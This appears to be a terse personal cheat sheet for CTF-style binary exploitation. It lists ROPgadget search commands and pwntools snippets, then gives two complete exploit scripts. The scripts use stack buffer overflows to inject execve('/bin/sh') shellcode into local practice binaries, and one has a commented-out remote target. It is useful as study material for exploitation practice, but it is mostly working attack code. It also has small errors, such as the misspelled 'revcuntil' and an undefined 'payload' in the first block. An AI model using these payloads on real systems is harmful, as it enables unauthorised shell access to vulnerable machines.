ROPgadget:
ROPgadget --binary ret2syscall --only 'pop|ret' | grep "eax"
ROPgadget --binary ret2syscall --string '/bin/sh'

pwntools:
from pwn import *
sh = process('./ret2syscall')
shellcode = "\x6a\x0b\x58\x31\xf6\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\xcd\x80"
sh.sendline(payload)
sh.interactive()
sh.recvline()
sh.revcuntil('[')--->daadsds[
sh.revcuntil(']',drop=True)--->0x11223344

eg1:
from pwn import *
sh = process('./pwn6')
esp=0xffffd1da
shellcode = "\x6a\x0b\x58\x31\xf6\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\xcd\x80"
payload = shellcode+'\x90'*12+p32(esp-0x24)
sh.sendline(payload)
sh.interactive()



eb2
:#coding:utf-8
from pwn import *
context.log_level = 'debug'
p = process('./pwn1')
#p = remote('172.16.5.7',8888)
print(p.recvuntil("hey, what's your name?"))
#send jmpesp to id
jmpesp = asm('jmp rsp',arch='amd64')
p.sendline(jmpesp)
print(p.recvuntil('>'))
p.sendline("1")
address_jmpesp = 0x00000000006020A0

shellcode = asm(shellcraft.amd64.linux.sh(), arch = 'amd64')
payload = 'A'*40+p64(address_jmpesp)+shellcode

p.sendline(payload)
p.interactive()

  
